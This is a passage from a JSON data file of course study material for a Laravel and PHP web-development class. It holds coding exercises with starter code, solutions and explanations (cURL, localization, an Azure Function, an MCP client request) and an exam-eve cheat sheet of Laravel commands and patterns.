\u003ccode\u003ehttps://api.example.com/students\u003c/code\u003e using PHP cURL. Store the decoded JSON response in a PHP associative array called \u003ccode\u003e$students\u003c/code\u003e.\u003c/p\u003e\n\u003cp\u003eUse the standard five-step sequence: \u003ccode\u003ecurl_init()\u003c/code\u003e → \u003ccode\u003ecurl_setopt()\u003c/code\u003e → \u003ccode\u003ecurl_exec()\u003c/code\u003e → \u003ccode\u003ecurl_close()\u003c/code\u003e → \u003ccode\u003ejson_decode()\u003c/code\u003e.\u003c/p\u003e","starter":"\u003c?php\n\n// TODO 1: Initialize a cURL session and store the handle in $ch\n\n// TODO 2: Set CURLOPT_URL to 'https://api.example.com/students'\n\n// TODO 3: Set CURLOPT_RETURNTRANSFER to true so the response is stored, not printed\n\n// TODO 4: Execute the request and store the raw response in $response\n\n// TODO 5: Close/release the cURL handle\n\n// TODO 6: Decode the JSON response into a PHP associative array called $students\n\nvar_dump($students);\n?\u003e","solution":"\u003c?php\n\n// Step 1: Initialize — get a cURL handle\n$ch = curl_init();\n\n// Step 2: Configure the URL and return-transfer option\ncurl_setopt($ch, CURLOPT_URL, 'https://api.example.com/students');\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n\n// Step 3: Execute — sends the HTTP GET request\n$response = curl_exec($ch);\n\n// Step 4: Release the cURL handle\ncurl_close($ch);\n\n// Step 5: Decode JSON string into a PHP associative array\n$students = json_decode($response, true);\n\nvar_dump($students);\n?\u003e","why_html":"\u003cp\u003e\u003cstrong\u003eStep 1 — \u003ccode\u003ecurl_init()\u003c/code\u003e\u003c/strong\u003e opens a new cURL session and returns a \u003cstrong\u003ecURL handle\u003c/strong\u003e (a PHP resource). Every subsequent \u003ccode\u003ecurl_*\u003c/code\u003e call takes that handle as its first argument. Without it there is no session to configure or execute.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 2 — \u003ccode\u003ecurl_setopt()\u003c/code\u003e × 2\u003c/strong\u003e configures the request. \u003ccode\u003eCURLOPT_URL\u003c/code\u003e sets the target endpoint. \u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e is the critical option: when set to \u003ccode\u003etrue\u003c/code\u003e, \u003ccode\u003ecurl_exec()\u003c/code\u003e captures the response body as a string and assigns it to \u003ccode\u003e$response\u003c/code\u003e. Without it, \u003ccode\u003ecurl_exec()\u003c/code\u003e sends the response straight to the browser — \u003ccode\u003e$response\u003c/code\u003e receives \u003ccode\u003etrue\u003c/code\u003e (boolean), not the data. Calling \u003ccode\u003ejson_decode(true, true)\u003c/code\u003e returns \u003ccode\u003enull\u003c/code\u003e with no error — a silent failure that is hard to diagnose.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 3 — \u003ccode\u003ecurl_exec($ch)\u003c/code\u003e\u003c/strong\u003e sends the HTTP request. If the request fails, it returns \u003ccode\u003efalse\u003c/code\u003e; check with \u003ccode\u003eif ($response === false)\u003c/code\u003e (strict equality, because an empty string \u003ccode\u003e&#39;&#39;\u003c/code\u003e is a valid response).\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 4 — \u003ccode\u003ecurl_close($ch)\u003c/code\u003e\u003c/strong\u003e frees the cURL handle and its associated memory. Omitting this leaks the resource for the duration of the script.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStep 5 — \u003ccode\u003ejson_decode($response, true)\u003c/code\u003e\u003c/strong\u003e converts the JSON string into a PHP associative array. The second argument \u003ccode\u003etrue\u003c/code\u003e is mandatory for array output — without it you get a \u003ccode\u003estdClass\u003c/code\u003e object and must use \u003ccode\u003e-&gt;\u003c/code\u003e property access instead of \u003ccode\u003e[&#39;key&#39;]\u003c/code\u003e syntax.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eCommon wrong approach:\u003c/strong\u003e Many beginners skip \u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e and wonder why the response appears on screen and \u003ccode\u003e$response\u003c/code\u003e is unusable. Others pass \u003ccode\u003ejson_decode($response)\u003c/code\u003e without \u003ccode\u003etrue\u003c/code\u003e and then get PHP errors when they try \u003ccode\u003e$students[0][&#39;name&#39;]\u003c/code\u003e on an object.\u003c/p\u003e"},{"kind":"code","variant":"starter-solution","n":12,"id":"localization-setup","title":"Localization setup — PHP translation file, __(), trans_choice()","lang":"php","tags":["localization","i18n","laravel","translation"],"source":"localization.pptx slides 4–7; laravel-localization.docx","prompt_html":"\u003cp\u003eCreate a PHP translation file for the \u003ccode\u003een\u003c/code\u003e locale that defines a welcome message and an item-count string. Then write a PHP snippet that:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eUses \u003ccode\u003e__()\u003c/code\u003e to retrieve the welcome message.\u003c/li\u003e\n\u003cli\u003eUses \u003ccode\u003etrans_choice()\u003c/code\u003e to render the item-count string for counts of 0, 1, and 5.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eThe item-count string must use pipe-delimited plural rules covering zero, one, and two-or-more.\u003c/p\u003e","starter":"\u003c?php\n\n// FILE 1: resources/lang/en/messages.php\n// TODO 1: Return an associative array with two keys:\n//   'welcome' =\u003e the string 'Welcome to our application'\n//   'items'   =\u003e a pipe-delimited pluralization string covering\n//                {0} no items, {1} one item, [2,*] :count items\n\n// FILE 2: A controller or route closure (simulate with plain PHP here)\n// TODO 2: Call __() to retrieve the 'messages.welcome' string and echo it.\n\n// TODO 3: Call trans_choice() three times for 'messages.items' with\n//         counts 0, 1, and 5. Echo each result on its own line.","solution":"\u003c?php\n\n// FILE 1: resources/lang/en/messages.php\nreturn [\n    'welcome' =\u003e 'Welcome to our application',\n    'items'   =\u003e '{0} No items|{1} One item|[2,*] :count items',\n];\n\n// FILE 2: Route closure / controller action\n// Retrieve a simple translated string\necho __('messages.welcome');\n// Output: Welcome to our application\n\n// Pluralized translations\necho trans_choice('messages.items', 0);  // No items\necho trans_choice('messages.items', 1);  // One item\necho trans_choice('messages.items', 5);  // 5 items","why_html":"\u003cp\u003e\u003ccode\u003e__(&#39;messages.welcome&#39;)\u003c/code\u003e uses dot notation: \u003ccode\u003emessages\u003c/code\u003e is the filename (\u003ccode\u003emessages.php\u003c/code\u003e) and \u003ccode\u003ewelcome\u003c/code\u003e is the array key. Laravel loads the file for the active locale — \u003ccode\u003eresources/lang/{locale}/messages.php\u003c/code\u003e — and returns the matching value.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003etrans_choice()\u003c/code\u003e evaluates the pipe-delimited string left-to-right, returning the first rule whose range covers the count. \u003ccode\u003e{0}\u003c/code\u003e matches exactly 0; \u003ccode\u003e{1}\u003c/code\u003e matches exactly 1; \u003ccode\u003e[2,*]\u003c/code\u003e matches 2 through infinity. The \u003ccode\u003e:count\u003c/code\u003e placeholder is replaced with the numeric argument.\u003c/p\u003e\n\u003cp\u003eTwo common wrong approaches:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003eUsing \u003ccode\u003etrans()\u003c/code\u003e instead of \u003ccode\u003e__()\u003c/code\u003e.\u003c/strong\u003e \u003ccode\u003etrans()\u003c/code\u003e is a lower-level function. The canonical form is \u003ccode\u003e__()\u003c/code\u003e — Laravel docs and all examples use this helper. Never substitute it.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUsing \u003ccode\u003e__()\u003c/code\u003e for pluralization.\u003c/strong\u003e \u003ccode\u003e__()\u003c/code\u003e cannot evaluate pipe-delimited rules. It returns the raw string verbatim, including the \u003ccode\u003e|\u003c/code\u003e characters. Always use \u003ccode\u003etrans_choice()\u003c/code\u003e when the output depends on a count.\u003c/li\u003e\n\u003c/ol\u003e"},{"kind":"code","variant":"starter-solution","n":13,"id":"azure-function-http","title":"HTTP-triggered Azure Function — query-string greeting","lang":"typescript","tags":["azure","serverless","typescript","http-trigger"],"source":"ts-function-apps.pptx slide 7; static-web-apps-SCRIPT.docx","prompt_html":"\u003cp\u003eWrite a minimal HTTP-triggered Azure Function in TypeScript. The function reads a \u003ccode\u003ename\u003c/code\u003e parameter from the query string. It returns a JSON response \u003ccode\u003e{ &quot;message&quot;: &quot;Hello, &lt;name&gt;!&quot; }\u003c/code\u003e with HTTP 200. If \u003ccode\u003ename\u003c/code\u003e is absent, use \u003ccode\u003e&quot;World&quot;\u003c/code\u003e as the default.\u003c/p\u003e\n\u003cp\u003eUse the typed imports \u003ccode\u003eAzureFunction\u003c/code\u003e, \u003ccode\u003eContext\u003c/code\u003e, and \u003ccode\u003eHttpRequest\u003c/code\u003e from \u003ccode\u003e@azure/functions\u003c/code\u003e.\u003c/p\u003e","starter":"import { AzureFunction, Context, HttpRequest } from \"@azure/functions\";\n\nconst httpTrigger: AzureFunction = async (context: Context, req: HttpRequest) =\u003e {\n  // TODO: read 'name' from req.query\n  // TODO: set context.res with status 200, JSON body, and Content-Type header\n};\n\nexport default httpTrigger;","solution":"import { AzureFunction, Context, HttpRequest } from \"@azure/functions\";\n\nconst httpTrigger: AzureFunction = async (context: Context, req: HttpRequest) =\u003e {\n  const name = req.query.name || \"World\";\n\n  context.res = {\n    status: 200,\n    headers: { \"Content-Type\": \"application/json\" },\n    body: JSON.stringify({ message: `Hello, ${name}!` }),\n  };\n};\n\nexport default httpTrigger;","why_html":"\u003cp\u003e\u003ccode\u003ereq.query.name\u003c/code\u003e is typed as \u003ccode\u003estring | undefined\u003c/code\u003e by \u003ccode\u003eHttpRequest\u003c/code\u003e. The \u003ccode\u003e|| &quot;World&quot;\u003c/code\u003e fallback handles the undefined case without a separate null check.\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003econtext.res\u003c/code\u003e is the output binding declared in \u003ccode\u003efunction.json\u003c/code\u003e with \u003ccode\u003e&quot;direction&quot;: &quot;out&quot;\u003c/code\u003e and \u003ccode\u003e&quot;type&quot;: &quot;http&quot;\u003c/code\u003e. Assigning to it is the correct output pattern — do not \u003ccode\u003ereturn\u003c/code\u003e a value from the function body (that is a common wrong approach that silently does nothing in the v3/v4 runtime without proper config).\u003c/p\u003e\n\u003cp\u003eSetting \u003ccode\u003e&quot;Content-Type&quot;: &quot;application/json&quot;\u003c/code\u003e explicitly prevents Azure from defaulting to \u003ccode\u003etext/plain\u003c/code\u003e, which causes consumers to receive the JSON as a string rather than a parsed object.\u003c/p\u003e\n\u003cp\u003eTwo frequent wrong approaches:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUsing \u003ccode\u003ereturn { body: ... }\u003c/code\u003e without assigning \u003ccode\u003econtext.res\u003c/code\u003e — works only in newer runtime variants and is not the pattern shown in slides.\u003c/li\u003e\n\u003cli\u003eOmitting the \u003ccode\u003eContent-Type\u003c/code\u003e header — the response arrives as plain text, breaking JSON consumers.\u003c/li\u003e\n\u003c/ul\u003e"},{"kind":"code","variant":"starter-solution","n":14,"id":"mcp-client-request","title":"PHP MCP client — tools/list via cURL","lang":"php","tags":["mcp","curl","json-rpc","php","tools"],"source":"laravel_mcp.pptx slides 4–5; cURL.pptx slides 4–6","prompt_html":"\u003cp\u003eWrite a PHP function \u003ccode\u003elist_mcp_tools(string $serverUrl): array\u003c/code\u003e that sends a \u003ccode\u003etools/list\u003c/code\u003e request to an MCP server using cURL.\u003c/p\u003e\n\u003cp\u003eRequirements:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eUse the JSON-RPC 2.0 format: \u003ccode\u003ejsonrpc\u003c/code\u003e, \u003ccode\u003eid\u003c/code\u003e, \u003ccode\u003emethod\u003c/code\u003e fields.\u003c/li\u003e\n\u003cli\u003eSet the \u003ccode\u003eContent-Type: application/json\u003c/code\u003e header.\u003c/li\u003e\n\u003cli\u003eReturn the decoded JSON response as a PHP array.\u003c/li\u003e\n\u003cli\u003eHandle cURL failure by throwing a \u003ccode\u003eRuntimeException\u003c/code\u003e with the cURL error message.\u003c/li\u003e\n\u003c/ul\u003e","starter":"\u003c?php\n\nfunction list_mcp_tools(string $serverUrl): array\n{\n    $payload = json_encode([\n        // TODO: fill in the JSON-RPC 2.0 fields\n    ]);\n\n    $handle = curl_init($serverUrl);\n\n    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);\n    // TODO: set POST method, body, and headers\n\n    $response = curl_exec($handle);\n\n    if ($response === false) {\n        // TODO: throw RuntimeException with cURL error\n    }\n\n    curl_close($handle);\n\n    // TODO: decode and return the JSON response\n}","solution":"\u003c?php\n\nfunction list_mcp_tools(string $serverUrl): array\n{\n    $payload = json_encode([\n        'jsonrpc' =\u003e '2.0',\n        'id'      =\u003e 1,\n        'method'  =\u003e 'tools/list',\n    ]);\n\n    $handle = curl_init($serverUrl);\n\n    curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);\n    curl_setopt($handle, CURLOPT_POST, true);\n    curl_setopt($handle, CURLOPT_POSTFIELDS, $payload);\n    curl_setopt($handle, CURLOPT_HTTPHEADER, [\n        'Content-Type: application/json',\n    ]);\n\n    $response = curl_exec($handle);\n\n    if ($response === false) {\n        $error = curl_error($handle);\n        curl_close($handle);\n        throw new RuntimeException(\"cURL error: $error\");\n    }\n\n    curl_close($handle);\n\n    return json_decode($response, true);\n}","why_html":"\u003cp\u003e\u003cstrong\u003eJSON-RPC 2.0 format.\u003c/strong\u003e Every Model Context Protocol message is a JSON-RPC 2.0 envelope. The three required fields are \u003ccode\u003ejsonrpc\u003c/code\u003e (always the string \u003ccode\u003e&quot;2.0&quot;\u003c/code\u003e), \u003ccode\u003eid\u003c/code\u003e (a client-chosen integer so responses can be matched to requests), and \u003ccode\u003emethod\u003c/code\u003e (the operation name). For discovery, the method is \u003ccode\u003etools/list\u003c/code\u003e. A common wrong approach is omitting \u003ccode\u003ejsonrpc\u003c/code\u003e or sending the method as a query parameter — both violate the JSON-RPC spec and will be rejected by a compliant server.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eWhy cURL.\u003c/strong\u003e PHP&#39;s native cURL extension gives direct control over HTTP method, headers, and body. \u003ccode\u003eCURLOPT_RETURNTRANSFER\u003c/code\u003e is the critical option: without it, \u003ccode\u003ecurl_exec()\u003c/code\u003e prints the response directly to output instead of returning it as a string. \u003ccode\u003eCURLOPT_POST\u003c/code\u003e switches the request from GET to POST, required because JSON-RPC sends a body. A common mistake is setting \u003ccode\u003eCURLOPT_URL\u003c/code\u003e separately after \u003ccode\u003ecurl_init()\u003c/code\u003e — passing the URL to \u003ccode\u003ecurl_init()\u003c/code\u003e directly is equivalent and cleaner.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eRequest/response structure.\u003c/strong\u003e The server responds with a JSON object containing a \u003ccode\u003eresult\u003c/code\u003e key (on success) or an \u003ccode\u003eerror\u003c/code\u003e key (on failure). \u003ccode\u003ejson_decode($response, true)\u003c/code\u003e converts the JSON string to a PHP associative array. Always check for a cURL-level failure (\u003ccode\u003e$response === false\u003c/code\u003e) before attempting to decode — otherwise \u003ccode\u003ejson_decode(false, true)\u003c/code\u003e silently returns \u003ccode\u003enull\u003c/code\u003e and the caller receives no error signal.\u003c/p\u003e"}],"cheatSheet":{"title":"COMP 3975 — exam-eve cheat sheet","blocks":[{"heading":"Artisan key commands","body_md":"- `php artisan serve --port=8888` — start dev server\n- `php artisan make:model Name -m` — model + migration\n- `php artisan make:controller Name --resource` — RESTful controller\n- `php artisan make:migration create_table_name` — migration only\n- `php artisan migrate` · `migrate:refresh --seed` · `migrate:rollback`\n- `php artisan make:seeder NameSeeder` · `db:seed`\n- `php artisan jwt:secret` — generate JWT signing key\n- `php artisan l5-swagger:generate` — regenerate Swagger docs\n- `php artisan breeze:install` — install session auth scaffold\n- `php artisan route:clear` · `config:clear` · `cache:clear`\n- `php artisan tinker` — interactive REPL\n- `php artisan make:mcp-server Name` · `make:mcp-tool Name`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan serve --port=8888\u003c/code\u003e — start dev server\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:model Name -m\u003c/code\u003e — model + migration\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:controller Name --resource\u003c/code\u003e — RESTful controller\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:migration create_table_name\u003c/code\u003e — migration only\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan migrate\u003c/code\u003e · \u003ccode\u003emigrate:refresh --seed\u003c/code\u003e · \u003ccode\u003emigrate:rollback\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:seeder NameSeeder\u003c/code\u003e · \u003ccode\u003edb:seed\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan jwt:secret\u003c/code\u003e — generate JWT signing key\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan l5-swagger:generate\u003c/code\u003e — regenerate Swagger docs\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan breeze:install\u003c/code\u003e — install session auth scaffold\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan route:clear\u003c/code\u003e · \u003ccode\u003econfig:clear\u003c/code\u003e · \u003ccode\u003ecache:clear\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan tinker\u003c/code\u003e — interactive REPL\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ephp artisan make:mcp-server Name\u003c/code\u003e · \u003ccode\u003emake:mcp-tool Name\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"MVC + Blade templating","body_md":"- **MVC**: Model (data/DB), View (Blade templates), Controller (logic)\n- **Layout**: `@extends('layouts.master')` + `@section('name')` / `@endsection`\n- **Yield slot**: `@yield('name')` in layout file\n- **Include partial**: `@include('partials.nav')`\n- **Escaped output** (XSS-safe): `{{ $var }}`\n- **Unescaped output** (XSS risk): `{!! $var !!}`\n- **Control flow**: `@if($x)` / `@elseif` / `@else` / `@endif`; `@foreach($items as $item)` / `@endforeach`\n- **Blade components**: `\u003cx-component-name\u003e`, `\u003cx-slot name=\"content\"\u003e`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eMVC\u003c/strong\u003e: Model (data/DB), View (Blade templates), Controller (logic)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eLayout\u003c/strong\u003e: \u003ccode\u003e@extends(&#39;layouts.master&#39;)\u003c/code\u003e + \u003ccode\u003e@section(&#39;name&#39;)\u003c/code\u003e / \u003ccode\u003e@endsection\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eYield slot\u003c/strong\u003e: \u003ccode\u003e@yield(&#39;name&#39;)\u003c/code\u003e in layout file\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eInclude partial\u003c/strong\u003e: \u003ccode\u003e@include(&#39;partials.nav&#39;)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eEscaped output\u003c/strong\u003e (XSS-safe): \u003ccode\u003e{{ $var }}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUnescaped output\u003c/strong\u003e (XSS risk): \u003ccode\u003e{!! $var !!}\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eControl flow\u003c/strong\u003e: \u003ccode\u003e@if($x)\u003c/code\u003e / \u003ccode\u003e@elseif\u003c/code\u003e / \u003ccode\u003e@else\u003c/code\u003e / \u003ccode\u003e@endif\u003c/code\u003e; \u003ccode\u003e@foreach($items as $item)\u003c/code\u003e / \u003ccode\u003e@endforeach\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eBlade components\u003c/strong\u003e: \u003ccode\u003e&lt;x-component-name&gt;\u003c/code\u003e, \u003ccode\u003e&lt;x-slot name=&quot;content&quot;&gt;\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Eloquent ORM","body_md":"- `Model::all()` — all records (not `::get()`, not `::all()-\u003eget()`)\n- `Model::find($id)` — one record by PK (null if missing)\n- `Model::findOrFail($id)` — one record or 404 exception\n- `Model::where('col', $val)-\u003eget()`\n- `Model::create($data)` — requires `$fillable` on model\n- `$model-\u003esave()` · `$model-\u003eupdate($data)` · `$model-\u003edelete()`\n- **Mass assignment**: add `protected $fillable = ['col1', 'col2']` to model\n- **Relationships**: `hasMany(Related::class)` · `belongsTo(Related::class)`\n- `whereBelongsTo($user)` shorthand for ownership filter\n- **Auth facade**: `Auth::user()` · `Auth::id()`\n- DB access hierarchy: **Eloquent** \u003e Query Builder \u003e Raw SQL","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eModel::all()\u003c/code\u003e — all records (not \u003ccode\u003e::get()\u003c/code\u003e, not \u003ccode\u003e::all()-&gt;get()\u003c/code\u003e)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eModel::find($id)\u003c/code\u003e — one record by PK (null if missing)\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eModel::findOrFail($id)\u003c/code\u003e — one record or 404 exception\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eModel::where(&#39;col&#39;, $val)-&gt;get()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eModel::create($data)\u003c/code\u003e — requires \u003ccode\u003e$fillable\u003c/code\u003e on model\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003e$model-&gt;save()\u003c/code\u003e · \u003ccode\u003e$model-&gt;update($data)\u003c/code\u003e · \u003ccode\u003e$model-&gt;delete()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMass assignment\u003c/strong\u003e: add \u003ccode\u003eprotected $fillable = [&#39;col1&#39;, &#39;col2&#39;]\u003c/code\u003e to model\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRelationships\u003c/strong\u003e: \u003ccode\u003ehasMany(Related::class)\u003c/code\u003e · \u003ccode\u003ebelongsTo(Related::class)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003ewhereBelongsTo($user)\u003c/code\u003e shorthand for ownership filter\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAuth facade\u003c/strong\u003e: \u003ccode\u003eAuth::user()\u003c/code\u003e · \u003ccode\u003eAuth::id()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eDB access hierarchy: \u003cstrong\u003eEloquent\u003c/strong\u003e &gt; Query Builder &gt; Raw SQL\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Query Builder + Raw SQL","body_md":"- `DB::table('name')-\u003eselect('col')-\u003ewhere('col', $val)-\u003eget()`\n- `DB::select('SELECT * FROM t WHERE id = ?', [$id])` — raw SQL\n- Enable query log: `DB::enableQueryLog()` then `DB::getQueryLog()`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eDB::table(&#39;name&#39;)-&gt;select(&#39;col&#39;)-&gt;where(&#39;col&#39;, $val)-&gt;get()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eDB::select(&#39;SELECT * FROM t WHERE id = ?&#39;, [$id])\u003c/code\u003e — raw SQL\u003c/li\u003e\n\u003cli\u003eEnable query log: \u003ccode\u003eDB::enableQueryLog()\u003c/code\u003e then \u003ccode\u003eDB::getQueryLog()\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Migrations + Seeders","body_md":"- Migration `up()`: `Schema::create('table', fn($t) =\u003e ...)` with `$t-\u003eid()`, `$t-\u003estring()`, `$t-\u003etimestamps()`\n- Migration `down()`: `Schema::dropIfExists('table')`\n- Seeder `run()`: `Model::create([...])` or `DB::table()-\u003einsert([...])`","body_html":"\u003cul\u003e\n\u003cli\u003eMigration \u003ccode\u003eup()\u003c/code\u003e: \u003ccode\u003eSchema::create(&#39;table&#39;, fn($t) =&gt; ...)\u003c/code\u003e with \u003ccode\u003e$t-&gt;id()\u003c/code\u003e, \u003ccode\u003e$t-&gt;string()\u003c/code\u003e, \u003ccode\u003e$t-&gt;timestamps()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eMigration \u003ccode\u003edown()\u003c/code\u003e: \u003ccode\u003eSchema::dropIfExists(&#39;table&#39;)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSeeder \u003ccode\u003erun()\u003c/code\u003e: \u003ccode\u003eModel::create([...])\u003c/code\u003e or \u003ccode\u003eDB::table()-&gt;insert([...])\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"REST API design","body_md":"- `Route::resource('items', ItemController::class)` — 7 RESTful routes\n- `Route::apiResource(...)` — 5 routes (no create/edit views)\n- Validation: `$request-\u003evalidate(['field' =\u003e 'required|string|max:255'])`\n- JSON response: `return response()-\u003ejson($data, 200)`\n- `findOrFail()` auto-returns 404 on missing record\n- CORS: enabled by default; `config/cors.php` for credentials","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003eRoute::resource(&#39;items&#39;, ItemController::class)\u003c/code\u003e — 7 RESTful routes\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003eRoute::apiResource(...)\u003c/code\u003e — 5 routes (no create/edit views)\u003c/li\u003e\n\u003cli\u003eValidation: \u003ccode\u003e$request-&gt;validate([&#39;field&#39; =&gt; &#39;required|string|max:255&#39;])\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eJSON response: \u003ccode\u003ereturn response()-&gt;json($data, 200)\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003e\u003ccode\u003efindOrFail()\u003c/code\u003e auto-returns 404 on missing record\u003c/li\u003e\n\u003cli\u003eCORS: enabled by default; \u003ccode\u003econfig/cors.php\u003c/code\u003e for credentials\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"JWT authentication","body_md":"- Package: `composer require php-open-source-saver/jwt-auth`\n- Generate key: `php artisan jwt:secret`\n- Auth guard: `config/auth.php` — `'driver' =\u003e 'jwt'`\n- User model must implement `JWTSubject`: add `getJWTIdentifier()` + `getJWTCustomClaims()`\n- Token structure: `header.payload.signature` (all base64-encoded, dot-separated)\n- **Reserved claims**: `iat` issued-at · `exp` expiration · `sub` subject · `iss` issuer · `aud` audience · `nbf` not-before · `jti` JWT-ID\n- Request header: `Authorization: Bearer \u003ctoken\u003e`\n- AuthController routes: login · register · logout · refresh · user","body_html":"\u003cul\u003e\n\u003cli\u003ePackage: \u003ccode\u003ecomposer require php-open-source-saver/jwt-auth\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eGenerate key: \u003ccode\u003ephp artisan jwt:secret\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAuth guard: \u003ccode\u003econfig/auth.php\u003c/code\u003e — \u003ccode\u003e&#39;driver&#39; =&gt; &#39;jwt&#39;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUser model must implement \u003ccode\u003eJWTSubject\u003c/code\u003e: add \u003ccode\u003egetJWTIdentifier()\u003c/code\u003e + \u003ccode\u003egetJWTCustomClaims()\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eToken structure: \u003ccode\u003eheader.payload.signature\u003c/code\u003e (all base64-encoded, dot-separated)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReserved claims\u003c/strong\u003e: \u003ccode\u003eiat\u003c/code\u003e issued-at · \u003ccode\u003eexp\u003c/code\u003e expiration · \u003ccode\u003esub\u003c/code\u003e subject · \u003ccode\u003eiss\u003c/code\u003e issuer · \u003ccode\u003eaud\u003c/code\u003e audience · \u003ccode\u003enbf\u003c/code\u003e not-before · \u003ccode\u003ejti\u003c/code\u003e JWT-ID\u003c/li\u003e\n\u003cli\u003eRequest header: \u003ccode\u003eAuthorization: Bearer &lt;token&gt;\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eAuthController routes: login · register · logout · refresh · user\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Session auth — Breeze","body_md":"- `composer require laravel/breeze --dev` → `php artisan breeze:install`\n- Uses **Tailwind CSS** (not Bootstrap)\n- Built-in routes: register, login, logout, password reset, email verify\n- Protect routes: `-\u003emiddleware(['auth'])` or `-\u003emiddleware(['auth', 'verified'])`\n- Sanctum alternative: `$user-\u003ecreateToken('name')-\u003eplainTextToken`","body_html":"\u003cul\u003e\n\u003cli\u003e\u003ccode\u003ecomposer require laravel/breeze --dev\u003c/code\u003e → \u003ccode\u003ephp artisan breeze:install\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eUses \u003cstrong\u003eTailwind CSS\u003c/strong\u003e (not Bootstrap)\u003c/li\u003e\n\u003cli\u003eBuilt-in routes: register, login, logout, password reset, email verify\u003c/li\u003e\n\u003cli\u003eProtect routes: \u003ccode\u003e-&gt;middleware([&#39;auth&#39;])\u003c/code\u003e or \u003ccode\u003e-&gt;middleware([&#39;auth&#39;, &#39;verified&#39;])\u003c/code\u003e\u003c/li\u003e\n\u003cli\u003eSanctum alternative: \u003ccode\u003e$user-&gt;createToken(&#39;name&#39;)-&gt;plainTextToken\u003c/code\u003e\u003c/li\u003e\n\u003c/ul\u003e"},{"heading":"Swagger / OpenAPI","body_md":"- **OpenAPI** = specification language (JSON/YAML contract)\n- **Swagger** = toolset (UI, Editor, Codegen) — not the same as OpenAPI\n- Package: `composer require darkaonline/l5-swagger -W`\n- Publish: `php artisan vendor:publish --provider=\"L5Swagger\\L5SwaggerServiceProvider\"`\n- Generate: `php artisan l5-swagger:generate`\n- Docs URL: `/api/documentation`\n- Base annotation: `#[OA\\Info(title:'API', version:'1.0')]` on a controller\n- Endpoint: `#[OA\\Get(path:'/api/items', ...)]` · `#[OA\\Post(...)]`\n- Response: `#[OA\\Response(response:200, description:'OK')]`\n- Schema: `#[OA\\Schema(schema:'Item', required:['name'], 